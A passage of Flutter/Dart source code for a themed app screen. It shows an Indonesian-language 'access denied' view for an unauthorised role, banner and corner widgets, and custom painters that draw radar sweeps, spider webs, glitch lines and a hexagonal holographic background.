                fontFamily: 'Ganang', color: _C.textP,
                fontSize: 18, fontWeight: FontWeight.w900, letterSpacing: 3)),
              const SizedBox(height: 12),
              Text(
                'Role ${widget.role.toUpperCase()} tidak memiliki akses.',
                style: const TextStyle(
                  fontFamily: 'ShareTechMono', color: _C.textS,
                  fontSize: 12, height: 1.6),
                textAlign: TextAlign.center,
              ),
              const SizedBox(height: 32),
              GestureDetector(
                onTap: ()=>Navigator.pop(context),
                child: Container(
                  padding: const EdgeInsets.symmetric(horizontal: 40, vertical: 14),
                  decoration: BoxDecoration(
                    borderRadius: BorderRadius.circular(12),
                    gradient: const LinearGradient(
                      colors: [_C.crimsonUp, _C.maroon],
                      begin: Alignment.topLeft, end: Alignment.bottomRight,
                    ),
                    border: Border.all(color: _C.goldBright.withOpacity(0.5)),
                    boxShadow: [BoxShadow(color: _C.crimson.withOpacity(0.5), blurRadius: 20)],
                  ),
                  child: const Text('KEMBALI', style: TextStyle(
                    fontFamily: 'Ganang', color: _C.goldBright,
                    fontWeight: FontWeight.w900, fontSize: 13, letterSpacing: 2)),
                ),
              ),
            ],
          ),
        ),
      ),
    ]),
  );

  Widget _banner(IconData icon, String msg, Color c) => Container(
    margin: const EdgeInsets.fromLTRB(14, 8, 14, 0),
    padding: const EdgeInsets.symmetric(horizontal: 14, vertical: 11),
    decoration: BoxDecoration(
      borderRadius: BorderRadius.circular(12),
      gradient: LinearGradient(colors: [c.withOpacity(0.15), c.withOpacity(0.03)]),
      border: Border.all(color: c.withOpacity(0.5), width: 1.2),
      boxShadow: [BoxShadow(color: c.withOpacity(0.2), blurRadius: 12)],
    ),
    child: Row(children: [
      Container(
        width: 26, height: 26,
        decoration: BoxDecoration(
          color: c.withOpacity(0.15),
          borderRadius: BorderRadius.circular(8),
          border: Border.all(color: c.withOpacity(0.4), width: 1),
        ),
        child: Icon(icon, color: c, size: 14),
      ),
      const SizedBox(width: 10),
      Expanded(child: Text(msg, style: TextStyle(
        fontFamily: 'ShareTechMono', color: c.withOpacity(0.9),
        fontSize: 11, fontWeight: FontWeight.w600))),
    ]),
  );

  Widget _corner(Color c, double size, double w, {bool topLeft=false, bool topRight=false, bool bottomLeft=false, bool bottomRight=false}) {
    return SizedBox(
      width: size, height: size,
      child: CustomPaint(painter: _CornerPainter(c, w, topLeft: topLeft, topRight: topRight, bottomLeft: bottomLeft, bottomRight: bottomRight)),
    );
  }
}

// ═══════════════════════════════════════════════════════════════════════════
// PAINTERS
// ═══════════════════════════════════════════════════════════════════════════
class _ScanPainter extends CustomPainter {
  final double t;
  _ScanPainter(this.t);
  @override
  void paint(Canvas canvas, Size size) {
    final c = size.center(Offset.zero);
    final r = size.width/2;
    for (int i=0;i<3;i++) {
      final op=(1-((t+i*0.33)%1.0))*0.6;
      canvas.drawCircle(c,r*((t+i*0.33)%1.0),Paint()
        ..color=_C.goldBright.withOpacity(op)
        ..style=PaintingStyle.stroke
        ..strokeWidth=1.5);
    }
    final grad=Paint()..shader=RadialGradient(colors:[_C.goldGlow,_C.goldBright])
      .createShader(Rect.fromCircle(center:c,radius:10));
    canvas.drawCircle(c,9,grad);
    canvas.drawCircle(c,5,Paint()..color=_C.bg);
    final sweep=t*2*math.pi;
    final sweepPaint=Paint()
      ..shader=SweepGradient(
        colors:[Colors.transparent,_C.goldBright.withOpacity(0.8)],
        endAngle:sweep, startAngle:0,
      ).createShader(Rect.fromCircle(center:c,radius:r*0.7))
      ..strokeWidth=2.5..style=PaintingStyle.stroke;
    canvas.drawArc(Rect.fromCircle(center:c,radius:r*0.7),-math.pi/2,sweep,false,sweepPaint);
  }
  @override bool shouldRepaint(_ScanPainter o)=>o.t!=t;
}

class _SpiderWebPainter extends CustomPainter {
  final double progress;
  final Color color;
  final double opacity;
  _SpiderWebPainter({required this.progress, required this.color, required this.opacity});

  @override
  void paint(Canvas canvas, Size size) {
    final cx = size.width / 2;
    final cy = size.height / 2;
    final paint = Paint()
      ..color = color.withOpacity(opacity)
      ..style = PaintingStyle.stroke
      ..strokeWidth = 0.8;

    const radialCount = 8;
    for (int i = 0; i < radialCount; i++) {
      final angle = (i / radialCount) * 2 * math.pi;
      final endX = cx + math.cos(angle) * size.width * 0.6;
      final endY = cy + math.sin(angle) * size.height * 0.7;
      canvas.drawLine(Offset(cx, cy), Offset(endX, endY), paint);
    }

    const ringCount = 3;
    for (int r = 1; r <= ringCount; r++) {
      final radius = (r / ringCount) * size.width * 0.45;
      final path = Path();
      for (int i = 0; i <= radialCount; i++) {
        final idx = i % radialCount;
        final angle = (idx / radialCount) * 2 * math.pi + (progress * 0.5);
        final nextAngle = ((idx + 1) % radialCount) / radialCount * 2 * math.pi + (progress * 0.5);
        final midAngle = (angle + nextAngle) / 2;
        final midRadius = radius * 0.85;
        final px = cx + math.cos(angle) * radius;
        final py = cy + math.sin(angle) * radius;
        if (i == 0) {
          path.moveTo(px, py);
        } else {
          final mx = cx + math.cos(midAngle) * midRadius;
          final my = cy + math.sin(midAngle) * midRadius;
          path.quadraticBezierTo(mx, my, px, py);
        }
      }
      canvas.drawPath(path, paint);
    }
  }

  @override
  bool shouldRepaint(_SpiderWebPainter o) => o.progress != progress || o.color != color;
}

class _GlitchPainter extends CustomPainter {
  final double progress;
  final Color color;
  _GlitchPainter({required this.progress, required this.color});

  @override
  void paint(Canvas canvas, Size size) {
    final rng = math.Random((progress * 1000).floor());
    final linePaint = Paint()..strokeWidth = 1;

    for (int i = 0; i < 2; i++) {
      if (rng.nextDouble() > 0.7) {
        final y = rng.nextDouble() * size.height;
        final x1 = rng.nextDouble() * size.width;
        final w = rng.nextDouble() * size.width * 0.3;
        linePaint.color = (rng.nextBool() ? color : _C.goldBright).withOpacity(0.2);
        canvas.drawLine(Offset(x1, y), Offset(x1 + w, y), linePaint);
      }
    }
  }

  @override
  bool shouldRepaint(_GlitchPainter o) => o.progress != progress;
}

class _CornerPainter extends CustomPainter {
  final Color color;
  final double width;
  final bool topLeft, topRight, bottomLeft, bottomRight;
  _CornerPainter(this.color, this.width, {this.topLeft=false, this.topRight=false, this.bottomLeft=false, this.bottomRight=false});

  @override
  void paint(Canvas canvas, Size size) {
    final p = Paint()
      ..color = color
      ..strokeWidth = width
      ..style = PaintingStyle.stroke
      ..strokeCap = StrokeCap.round;

    const len = 0.5;
    if (topLeft) {
      canvas.drawLine(Offset.zero, Offset(size.width*len, 0), p);
      canvas.drawLine(Offset.zero, Offset(0, size.height*len), p);
    }
    if (topRight) {
      canvas.drawLine(Offset(size.width, 0), Offset(size.width*(1-len), 0), p);
      canvas.drawLine(Offset(size.width, 0), Offset(size.width, size.height*len), p);
    }
    if (bottomLeft) {
      canvas.drawLine(Offset(0, size.height), Offset(size.width*len, size.height), p);
      canvas.drawLine(Offset(0, size.height), Offset(0, size.height*(1-len)), p);
    }
    if (bottomRight) {
      canvas.drawLine(Offset(size.width, size.height), Offset(size.width*(1-len), size.height), p);
      canvas.drawLine(Offset(size.width, size.height), Offset(size.width, size.height*(1-len)), p);
    }
  }

  @override
  bool shouldRepaint(_CornerPainter o) => o.color != color;
}

class _HoloBgPainter extends CustomPainter {
  final double t;
  final double disco;
  final double glitch;
  _HoloBgPainter(this.t, this.disco, this.glitch);

  @override
  void paint(Canvas canvas, Size size) {
    final angle = t * 2 * math.pi;

    final cxRadar = size.width / 2;
    final cyRadar = size.height * 0.3;
    final radarPaint = Paint()
      ..color = _C.goldBright.withOpacity(0.08)
      ..style = PaintingStyle.stroke
      ..strokeWidth = 0.8;
    for (double r = 60; r < size.width; r += 60) {
      canvas.drawCircle(Offset(cxRadar, cyRadar), r, radarPaint);
    }

    final sweepPaint = Paint()
      ..shader = SweepGradient(
        colors: [
          _C.crimsonUp.withOpacity(0.0),
          _C.crimsonUp.withOpacity(0.15),
          _C.crimsonUp.withOpacity(0.0),
        ],
        stops: const [0.0, 0.5, 1.0],
        transform: GradientRotation(angle),
      ).createShader(Rect.fromCircle(center: Offset(cxRadar, cyRadar), radius: 320));
    canvas.drawCircle(Offset(cxRadar, cyRadar), 320, sweepPaint);

    final hexPaint = Paint()
      ..color = _C.gold.withOpacity(0.05)
      ..style = PaintingStyle.stroke
      ..strokeWidth = 0.6;

    const hexSize = 30.0;
    final hexH = hexSize * math.sqrt(3);
    for (double y = 0; y < size.height + hexH; y += hexH * 0.5) {
      for (double x = 0; x < size.width + hexSize * 2; x += hexSize * 1.5) {
        final offsetX = (y / (hexH * 0.5)).round().isEven ? 0.0 : hexSize * 0.75;
        final path = Path();
        for (int i = 0; i < 6; i++) {
          final a2 = math.pi / 180 * (60 * i - 30);
          final px = x + offsetX + hexSize * math.cos(a2);
          final py = y + hexSize * math.sin(a2);
          if (i == 0) {
            path.moveTo(px, py);
          } else {
            path.lineTo(px, py);
          }
        }
        path.close();
        canvas.drawPath(path, hexPaint);
      }
    }

    final scanPaint = Paint()
      ..color = _C.crimson.withOpacity(0.03)
      ..strokeWidth = 1;
    for (double y = 0; y < size.height; y += 3) {
      canvas.drawLine(Offset(0, y), Offset(size.width, y), scanPaint);
    }

    final vignette = Paint()
      ..shader = RadialGradient(
        colors: [
          Colors.transparent,
          Colors.transparent,
          Colors.black.withOpacity(0.65),
          Colors.black.withOpacity(0.92),
        ],
        stops: const [0.0, 0.55, 0.85, 1.0],
        radius: 0.88,
      ).createShader(Rect.fromLTWH(0, 0, size.width, size.height));
    canvas.drawRect(Rect.fromLTWH(0, 0, size.width, size.height), vignette);
  }

  @override
  bool shouldRepaint(_HoloBgPainter o) => o.t != t || o.disco != disco || o.glitch != glitch;
}